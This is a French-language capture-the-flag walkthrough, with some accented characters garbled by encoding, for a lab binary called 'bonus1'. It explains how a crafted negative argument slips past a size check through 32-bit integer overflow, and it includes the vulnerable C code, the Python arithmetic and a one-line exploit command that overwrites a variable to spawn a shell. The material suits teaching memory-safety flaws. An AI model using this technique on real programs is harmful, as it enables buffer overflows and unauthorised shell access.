# Bonus1 - Integer Overflow Walkthrough : D'o√π vient -2147483637 ?

## Le Probl√®me
```c
number = atoi(argv[1]);
if (number < 10) {
    memcpy(buffer, argv[2], number * 4);  // Copie number*4 bytes
    if (number == 0x574f4c46) {           // "FLOW" en little-endian
        execl("/bin/sh", "sh", 0);
    }
}
```

## L'Objectif
- Copier **44 bytes** pour d√©border le buffer[40] et √©craser la variable `number`
- Avoir `number < 10` pour passer la premi√®re v√©rification
- √âcraser `number` avec "FLOW" pour d√©clencher le shell

## La Solution : Integer Overflow
1. **On veut** : `number * 4 = 44` ‚Üí donc `number = 11`
2. **Probl√®me** : `11 > 10` ‚ùå
3. **Astuce** : Utiliser un nombre n√©gatif qui donne le m√™me r√©sultat !

### Comment Trouver -2147483637 ?

**M√©thode simple :** INT_MIN + la valeur qu'on veut

```python
INT_MIN = -2147483648  # Plus petit entier 32-bit
number = INT_MIN + 11 # 11 est la valeur qu'on veut simuler
# R√©sultat : -2147483637
```

**Pourquoi √ßa marche ?**
En 32-bit, -2147483637 se "comporte" comme 11 √† cause de l'overflow !

### Le Calcul
```python
# Calcul normal (ce que Python fait) :
11 * 4 = 44
-2147483637 * 4 = -8589934548  # R√©sultat diff√©rent !

# Mais en 32-bit (ce que fait le processeur) :
11 * 4 = 44
(-2147483637 * 4) & 0xFFFFFFFF = 44  # M√™me r√©sultat !

# Pourquoi ? L'overflow 32-bit "coupe" les bits exc√©dentaires :
# 0xFFFFFFFF = masque qui garde seulement les 32 bits de poids faible
# -8589934548 & 0xFFFFFFFF = 44

# V√©rification
number = -2147483637
print(f"{number} < 10: {number < 10}")  # True ‚úÖ
print(f"Python complet: {number * 4}")  # -8589934548
print(f"Processeur 32-bit: {(number * 4) & 0xFFFFFFFF}")  # 44 ‚úÖ
```

## L'Exploit
```bash
./bonus1 -2147483637 $(python -c 'print("A"*40 + "FLOW")')
```

**R√©sultat** : `memcpy` copie 44 bytes, √©crase `number` avec "FLOW", et lance le shell ! üöÄ